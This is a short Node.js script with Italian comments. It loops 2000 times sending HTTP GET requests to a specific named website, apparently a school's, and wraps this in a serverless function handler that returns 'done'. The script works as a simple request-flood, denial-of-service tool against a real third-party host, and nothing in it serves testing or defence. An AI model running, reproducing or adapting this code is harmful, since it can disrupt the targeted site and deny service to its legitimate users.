const http = require('http');

// Definisci i dettagli della richiesta
const target = {
  hostname: 'www.buonarroti.tn.it',
  port: 80,
  path: '/',
  method: 'GET'
}

for (let i = 0; i < 2000; i++) {

    const req = http.request(target);
    req.end();
    
}

exports.handler = async (event, context) => {
    return {
        statusCode: 200,
        body: 'done',
    }
}